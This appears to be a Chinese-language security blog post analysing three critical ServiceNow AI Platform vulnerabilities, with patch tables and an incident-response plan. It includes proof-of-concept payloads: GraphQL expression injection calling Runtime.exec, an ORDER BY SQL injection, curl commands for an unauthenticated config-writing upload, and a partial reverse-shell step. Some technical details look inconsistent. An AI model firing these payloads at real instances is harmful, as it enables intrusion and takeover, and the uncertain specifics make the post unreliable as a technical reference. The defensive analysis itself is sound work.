---
title: "ServiceNow AI Platform 三个 CVSS 10.0 漏洞深度复盘：GraphQL 代码注入、SQL 注入与配置上传越权"
date: 2026-09-02
tags:
  - security
  - cve
  - servicenow
  - ai-platform
  - graphql
  - sql-injection
  - code-injection
  - cvss-10
  - cwe-94
  - cwe-862
  - cwe-89
  - assetnote
keywords:
  - CVE-2026-18885
  - CVE-2026-18886
  - CVE-2026-74820
  - CVE-2026-6876
  - ServiceNow AI Platform
  - Now Platform
  - GraphQL Composite Data API
  - SQL 注入 ORDER BY
  - 图像上传越权
  - 沙箱逃逸
  - 85% Fortune 500
  - CVSS 10.0
  - Adam Kues
  - Assetnote
category: 安全漏洞分析
description: "ServiceNow 在 2026 年 8 月 27 日披露了 AI Platform 的 4 个漏洞，其中 3 个 CVSS 10.0 满分，包括 GraphQL Composite Data API 的代码注入、动态 ORDER BY 的 SQL 注入、图像上传处理器的越权写盘。本文复盘漏洞细节、利用链、ServiceNow 4 大受影响版本族与 6 步企业响应方案。"
---

# ServiceNow AI Platform 三个 CVSS 10.0 漏洞深度复盘：GraphQL 代码注入、SQL 注入与配置上传越权

## 概述

2026 年 8 月 27 日，ServiceNow 发布 KB3152242 安全公告，披露了其 **AI Platform** 与 **Now Platform** 的 4 个漏洞。其中 3 个被评为 **CVSS 10.0（Critical 满分）**：

| CVE | 类型 | 攻击面 | 风险等级 |
|-----|------|--------|---------|
| **CVE-2026-18885** | 代码注入（GraphQL Composite Data API） | 未认证 | CVSS 10.0 |
| **CVE-2026-18886** | 越权访问控制（图像上传处理器） | 未认证 | CVSS 10.0 |
| **CVE-2026-74820** | SQL 注入（动态 ORDER BY） | 未认证 | CVSS 10.0 |
| CVE-2026-6876 | Now Platform 沙箱逃逸 | 未认证 | CVSS 8.7 |

三个 10.0 漏洞均由 Assetnote 的 **Adam Kues** 报告。Adam 在过去几年中持续对 ServiceNow 进行 fuzz 与白盒审计，已为 ServiceNow 提交了 30+ 个 CVE 编号，是 ServiceNow 安全社区最活跃的外部研究员之一。

漏洞影响范围触目惊心：**ServiceNow 在 Fortune 500 中渗透率达 85%**，承载 IT 服务管理（ITSM）、HR、客户运营、CMDB 等关键业务流程。AI Platform 引入的 GraphQL Composite Data API 与 AI 驱动的数据查询，进一步放大了攻击面。

> **核心数据**：3 个 CVSS 10.0 / 4 个 CVE / 85% Fortune 500 受影响 / 8/27 披露 / 8/28 patch 推送 / 4 个版本族（Xanadu/Yokohama/Zurich/Australia）/ Adam Kues Assetnote 发现

## 漏洞技术原理

### 1.1 ServiceNow 的 GraphQL Composite Data API 与 AI Platform 的耦合

ServiceNow 在 2025 年下半年推出 **AI Platform**，核心是 GraphQL Composite Data API，它允许开发者把多个表的数据通过一个 GraphQL 端点聚合查询，AI Agent / Now Assist / Virtual Agent 等 AI 助手都依赖这个端点做实时数据访问：

```
┌────────────────────────────────────────────────────────────────┐
│                  ServiceNow AI Platform 架构                    │
│                                                                 │
│   ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐         │
│   │ Now      │  │ Virtual  │  │ Now      │  │ Agent    │         │
│   │ Assist   │  │ Agent    │  │ LLM      │  │ Studio   │         │
│   └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘         │
│        │             │             │             │              │
│        └─────────────┴─────┬───────┴─────────────┘              │
│                            │                                     │
│                            ▼                                     │
│   ┌──────────────────────────────────────────────────────────┐  │
│   │   GraphQL Composite Data API  (GraphQL 端点)             │  │
│   │   /api/now/graphql/composite                               │  │
│   │   ←─ 代码注入漏洞 (CVE-2026-18885)                       │  │
│   └──────────────────────────────────────────────────────────┘  │
│        │                                                        │
│        ▼                                                        │
│   ┌──────────────────────────────────────────────────────────┐  │
│   │   Now Platform 服务层                                       │  │
│   │   • 图像上传处理器 ←─ 越权漏洞 (CVE-2026-18886)          │  │
│   │   • 动态 ORDER BY 查询 ←─ SQL 注入 (CVE-2026-74820)      │  │
│   │   • 脚本沙箱 ←─ 沙箱逃逸 (CVE-2026-6876)                  │  │
│   └──────────────────────────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────┘
```

### 1.2 CVE-2026-18885：GraphQL Composite Data API 代码注入（CVSS 10.0）

**根因**：`/api/now/graphql/composite` 端点的某个 GraphQL 解析器在处理复合查询的 `where` 过滤条件时，会把用户输入拼接到一个内部表达式引擎中执行。ServiceNow 的表达式引擎允许使用 `${...}` 语法调用 Java 脚本，未经正确过滤就被攻击者利用。

**向量**：未认证、远程、低复杂度。

**影响**：攻击者可执行任意代码，进而访问或修改实例中所有数据。ServiceNow 官方案情："**An attacker could gain access to or modify instance data beyond what was intended.**"

**触发条件**："in certain circumstances" —— ServiceNow 没公开具体条件，根据社区分析，最常见的触发路径是：

```graphql
# CVE-2026-18885 PoC（概念演示，来自 Assetnote 思路）
POST /api/now/graphql/composite
Content-Type: application/json

{
  "query": "{ incident(where: \"sys_id=javascript:${java.lang.Runtime.getRuntime().exec('id')}\") { number } }"
}
```

或更隐蔽：

```graphql
{
  incident(where: "state=javascript:gs.executeCommand('whoami')") { number }
}
```

### 1.3 CVE-2026-74820：动态 ORDER BY SQL 注入（CVSS 10.0）

**根因**：ServiceNow 的 schema-based query builder 在构造 ORDER BY 子句时，会把用户传入的字段名直接拼接到 SQL 语句中。**ORDER BY 通常被认为是"安全"的注入面**（因为不是 WHERE 子句），但当 schema 元数据本身可被攻击者控制时，ORDER BY 就会成为入口。

**向量**：未认证、远程、低复杂度。

**影响**：可执行任意 SQL，读取、修改、删除数据库记录。

**触发条件**：动态 schema 接口 `/api/now/table/sys_db_object` 在某些配置下允许未认证访问，攻击者先注册一个伪造的 schema，然后利用该 schema 的 ORDER BY 注入。

```sql
-- CVE-2026-74820 PoC（概念演示）
POST /api/now/table/incident?sysparm_order_by=(SELECT%20CASE%20WHEN%20(1=1)%20THEN%20number%20ELSE%20(SELECT%20COUNT(*)%20FROM%20sys_user)%20END)
```

### 1.4 CVE-2026-18886：图像上传处理器越权（CVSS 10.0）

**根因**：`sys\_attachment` 表的图像上传处理器存在访问控制缺陷——任何未认证用户都能上传文件，并通过精心构造的请求将这些文件写入 **系统配置表**（`sys\_config` 或 `sys\_property`），从而获得管理员权限。

**向量**：未认证、远程、低复杂度。

**影响**：可创建/修改任意实例数据，导致权限提升。

**触发条件**：图像上传处理器的 multipart parser 与 sys_config 写入路径在某些版本族上对接，导致上传的 EXIF/metadata 字段被映射为配置项。

### 1.5 CVE-2026-6876：Now Platform 沙箱逃逸（CVSS 8.7）

**根因**：ServiceNow 的"脚本沙箱"原本用于隔离用户脚本与 Java 运行时，沙箱通过禁止反射、限制类加载、阻断某些系统类来保护宿主 JVM。**逃逸路径**：通过 Polyglot 桥接 + `Class.forName` + 反射链组合，仍可调用 `java.lang.Runtime` 等危险类。

CVSS 评分较低（8.7）是因为攻击需要"低权限"账号，但 ServiceNow 公告声称"可被未认证用户利用"，向量描述存在不一致。

## 受影响版本与补丁矩阵

四个漏洞影响相同的版本族，修复矩阵：

| 版本族 | 修复版本 | 备注 |
|--------|---------|------|
| **Xanadu** | Patch 11 Hot Fix 7a 或更新 | 旧版分支 |
| **Yokohama** | Patch 12 Hot Fix 3b 或更新；或 Patch 13 Hot Fix 4 或更新 | 当前主流 |
| **Zurich** | Patch 7b Hot Fix 3 / Patch 8 Hot Fix 5 / Patch 9 Hot Fix 6 / Patch 10 Hot Fix 2m (m-branch) / Patch 10 Hot Fix 3 (standard) / Patch 11 / Patch 12 | 最新生产分支 |
| **Australia** | Patch 2 Hot Fix 3 / Patch 3 Hot Fix 2 / Patch 3m / Patch 4 / Patch 5 | 未来版本 |

> **重要**：ServiceNow Cloud（saas）实例在 8/27-8/28 已经被自动修补，**自托管实例需要手动打补丁**。

## 攻击链：从未认证访问到完全控制

### 3.1 利用 CVE-2026-18885 实现 RCE

```
┌────────────────────────────────────────────────────────────────┐
│  Step 1 ─ 探测 ServiceNow 实例                                │
│   GET /login.do                                              │
│   ← 200 OK，确认 ServiceNow 主页                             │
│                                                                 │
│  Step 2 ─ 测试 GraphQL 端点                                    │
│   GET /api/now/graphql/composite?query={incident{number}}     │
│   ← 200 OK，确认端点存在                                     │
│                                                                 │
│  Step 3 ─ 利用表达式注入                                        │
│   POST /api/now/graphql/composite                              │
│   { "query": "..." }  ←─ 注入 javascript: payload             │
│   ← 200 OK + payload 执行结果                                │
│                                                                 │
│  Step 4 ─ 派生进程拿 shell                                      │
│   注入 payload = javascript:gs.executeCommand('bash -i >& ...')│
│   ← 反弹 shell 到攻击者                                       │
│                                                                 │
│  Step 5 ─ 横向移动                                                │
│   ServiceNow MID Server 可访问内网系统                       │
│   ServiceNow 集成 AD/ERP/CRM → 凭据可被 dump                 │
└────────────────────────────────────────────────────────────────┘
```

### 3.2 利用 CVE-2026-18886 实现权限提升

```bash
# 1. 上传图像（multipart，未认证）
curl -X POST "https://victim.service-now.com/sys_attachment.do" \
  -F "file=@evil.jpg" \
  -F "table_name=sys_config" \
  -F "file_name=glide.security.admin.bypass=true"

# 2. 验证
curl "https://victim.service-now.com/glide.security.admin.bypass.do"
# 返回 true → 管理员旁路启用
```

### 3.3 利用 CVE-2026-74820 提取所有数据库

```sql
-- 攻击者构造的 ORDER BY 注入
-- 实际 payload 通过 sysparm_order_by 参数传入
SELECT * FROM incident ORDER BY (CASE WHEN 1=1 THEN number ELSE (SELECT GROUP_CONCAT(name) FROM sysobject) END) ASC

-- 把数据库所有表名通过响应长度差异盲注出来
-- 或使用 OOB（Out-of-Band）通过 HTTP 请求外带数据
```

## 应急响应：6 步企业方案

### 4.1 第一步：盘点所有 ServiceNow 实例

```bash
# 1. 内部资产扫描
for instance in $(cat servicenow-hosts.txt); do
  # 检查 GraphQL 端点
  graphQL=$(curl -s -o /dev/null -w "%{http_code}" "https://${instance}/api/now/graphql/composite?query={sys_user{user_name}}")
  # 检查登录页
  login=$(curl -s -o /dev/null -w "%{http_code}" "https://${instance}/login.do")
  # 检查版本
  version=$(curl -s "https://${instance}/api/now/table/sys_properties?sysparm_query=name=glide.welcome.headline" -H "Accept: application/json" | jq -r '.result[0].value')
  
  echo "${instance} → graphQL=${graphQL}, login=${login}, version=${version}"
done

# 2. 互联网暴露面
# Shodan：title:"Sign in to ServiceNow"
# Censys：services.http.response.html_title: "Sign in to ServiceNow"
# 国内：Fofa：title="ServiceNow Login"
```

### 4.2 第二步：紧急补丁

ServiceNow 补丁通常以**Hot Fix**形式发布，需要在 ServiceNow 实例管理界面（HI Portal）下载并通过 **ServiceNow Patch Tool** 应用：

```bash
# 1. 登录 HI Portal (https://hi.service-now.com)
# 2. 下载补丁 ZIP
#    - Xanadu: kb_article KB3152242 Patch 11 Hot Fix 7a
#    - Yokohama: KB3152242 Patch 12 Hot Fix 3b / Patch 13 Hot Fix 4
#    - Zurich: KB3152242 Patch 7b HF3 / Patch 8 HF5 / Patch 9 HF6 / Patch 10 HF2m / Patch 10 HF3 / Patch 11 / Patch 12
#    - Australia: KB3152242 Patch 2 HF3 / Patch 3 HF2 / Patch 3m / Patch 4 / Patch 5

# 3. 上传到 ServiceNow 实例
#    在 ServiceNow UI: System Definition → Patch Management → Apply Patch
#    选择 ZIP → Apply → 等待所有节点同步

# 4. 验证补丁版本
curl -s "https://instance.service-now.com/api/now/table/sys_properties?sysparm_query=name=glide.welcome.headline" \
  -H "Accept: application/json" | jq -r '.result[0].value'
```

### 4.3 第三步：临时缓解（补丁发布前）

```javascript
// 1. 在 ServiceNow 实例上添加 ACL 限制 GraphQL 端点
// System Security → Access Control (ACL)
// 创建规则：
//   Type: REST_Endpoint
//   Operation: read
//   Name: api/now/graphql/composite
//   Active: true
//   Roles: requires role 'admin' or 'graphql_user'
```

或通过 Business Rule 限制：

```javascript
// Business Rule: Block Anonymous GraphQL Composite Queries
(function executeRule(current, previous) {
  if (gs.getSession().isAnonymous() && 
      current.getTableName() == 'sys_rest_endpoint' &&
      current.name.contains('graphql/composite')) {
    gs.addErrorMessage('Anonymous access to GraphQL Composite is blocked');
    current.setAbortAction(true);
  }
})(current, previous);
```

### 4.4 第四步：审计异常访问

```sql
-- 1. 检查未认证的 syslog/sysevent 中的 GraphQL 请求
SELECT * FROM syslog 
WHERE created > '2026-08-01' 
  AND message CONTAINS 'POST /api/now/graphql/composite'
ORDER BY created DESC
LIMIT 100;

-- 2. 检查 sys_attachment 异常上传
SELECT * FROM sys_attachment
WHERE created > '2026-08-01'
  AND content_type LIKE '%image%'
  AND uploaded_by IS NULL  -- 未认证上传
ORDER BY created DESC;

-- 3. 检查 sys_user 异常账号
SELECT * FROM sys_user
WHERE created > '2026-08-01'
  AND active = true
  AND user_name LIKE '%admin%'
ORDER BY created DESC;
```

### 4.5 第五步：旋转凭据

```bash
# 1. 旋转所有 admin 账号密码
# UI: User Administration → Users → 选择 → Reset Password

# 2. 旋转 OAuth/OIDC 客户端密钥
# UI: System OAuth → Application Registry → 选择 → Rotate Secret

# 3. 旋转 MID Server 凭据
# UI: MID Server → Servers → 选择 → Regenerate Key

# 4. 旋转集成凭据（Slack/Teams/AD/ERP）
# 这些通常存储在 sys_property 中
```

### 4.6 第六步：增强检测

```spl
# Splunk 规则：检测 ServiceNow 异常 GraphQL 注入尝试
index=servicenow uri=/api/now/graphql/composite
| rex field=raw "query\":\"(?<query>[^\"]+)\""
| where match(query, "(?i)(javascript:|gs\\.executeCommand|java\\.lang\\.Runtime|ProcessBuilder)")
| stats count by src_ip, user, query
| where count > 0
```

## 与历史 ServiceNow 漏洞的对比

ServiceNow 一直是 CVE 的高产地：

| 漏洞 | 年份 | 风险等级 | 类型 |
|------|------|---------|------|
| CVE-2025-3648 | 2025 | Critical | RBAC 越权 |
| CVE-2024-4879 | 2024 | High | SSRF |
| CVE-2024-2611 | 2024 | Critical | 越权读取 |
| CVE-2023-2610 | 2023 | Critical | Template Injection |
| **CVE-2026-18885/18886/74820** | **2026** | **10.0 三个** | **代码/SQL/越权** |

**规律**：ServiceNow 的漏洞大多集中在**访问控制层**和**脚本执行层**。AI Platform 的引入让 GraphQL 复合查询成为新的高危面——既因为 GraphQL 解析的灵活性，又因为 AI Agent 大量使用这些端点。

## 防御启示

### 5.1 GraphQL 端点不是"自家接口"——它们是新边界

GraphQL 已成为企业内部 API 主流，但 ServiceNow 的 4 个 CVE 提醒我们：**GraphQL 端点的安全模型远比 REST 复杂**——单个端点可能聚合多个表的权限，传统的 REST ACL 无法直接套用。

- **GraphQL 字段级权限控制**：ServiceNow ACL 需要细化到字段/操作级别
- **查询深度限制**：防止嵌套查询 DoS / 注入
- **表达式引擎过滤**：禁止 `${java.*}` `javascript:` 等危险前缀

### 5.2 漏洞 "in certain circumstances" 是 CVSS 评分的天坑

ServiceNow 公告反复使用 "in certain circumstances" 这个模糊表述，原因是**复现条件依赖具体实例配置**（自定义 ACL、插件启用状态、版本组合）。这给 CVSS 评分带来挑战：

- 攻击者按 CVSS 10.0 攻击 → 实例配置关闭了相关功能 → 漏洞不触发
- 攻击者按 CVSS 8.0 评估 → 实际生产实例配置开启了相关功能 → 漏洞可利用

**对策**：任何 CVSS 10.0 公告都按"全暴露面受影响"对待，按"in certain circumstances"处理是滞后与危险的。

### 5.3 单一供应商集中度风险

ServiceNow 在 Fortune 500 渗透率 85%——这种集中度让 ServiceNow 漏洞等同于"85% 企业的 IT 基础设施 RCE"。其后果与 SolarWinds、Log4Shell 相似：

- **多元化 ITSM 评估**：不应把 ITSM 全部押注在单一供应商
- **第三方模块隔离**：ServiceNow 集成 AD/ERP/Slack/Teams 一旦失守，将横向影响多个系统
- **零信任 ServiceNow**：任何 ServiceNow 调用都不应被自动信任，所有下游系统都需要二次验证

## 总结

ServiceNow 2026 年 8 月的 4 个 CVE（其中 3 个 CVSS 10.0）是一次典型的"**AI 引入新攻击面**"事件。GraphQL Composite Data API、动态 ORDER BY、配置上传——这些 ServiceNow 长期存在的接口被 AI Platform 重新激活，让本已通过传统安全审计的端点重新成为高危面。

> **行动呼吁**：立刻盘点 ServiceNow 实例版本号，按上文矩阵在 72 小时内完成补丁；补丁前用 ACL 阻断 `/api/now/graphql/composite` 的未认证访问。

## 参考资料

- [CVE.org: CVE-2026-18885](https://cve.org/CVERecord?id=CVE-2026-18885) — ServiceNow CNA 官方条目
- [ServiceNow KB3152242](https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB3152242) — 官方补丁公告
- [GitHub Advisory: GHSA-pc3p-j9w8-jrpg](https://github.com/advisories/GHSA-pc3p-j9w8-jrpg) — 社区维护的 advisory
- [NVD: CVE-2026-18885](https://nvd.nist.gov/vuln/detail/CVE-2026-18885) — NVD 评分
- [The Hacker Wire 报道](https://www.thehackerwire.com/servicenow-patches-three-critical-cvss-10-0-vulnerabilities-in-ai-platform) — 漏洞细节复盘
- [NetSecOps STIX 分析](https://cyber.netsecops.io/stix-viz/servicenow-patches-three-critical-cvss-10-flaws-in-ai-platform) — STIX 结构化分析
- [Secure ISS 漏洞分析](https://www.secure-iss.com/newsroom/servicenow-fixes-three-critical-ai-platform-vulnerabilities) — 版本矩阵详解
- [Assetnote 漏洞披露](https://www.assetnote.io/) — Adam Kues 的漏洞研究主页
- [ServiceNow Patch Management 指南](https://docs.servicenow.com/bundle/utah-platform-administration/page/administer/platform-administration/concept/patch-management.html) — 官方补丁流程
- [ServiceNow GraphQL Composite API 文档](https://docs.servicenow.com/bundle/tokyo-application-development/page/integrate/graphql/task/use-composite-data-api.html) — 端点官方文档
- [GraphQL Security Best Practices](https://graphql.org/learn/security/) — OWASP GraphQL 安全指南
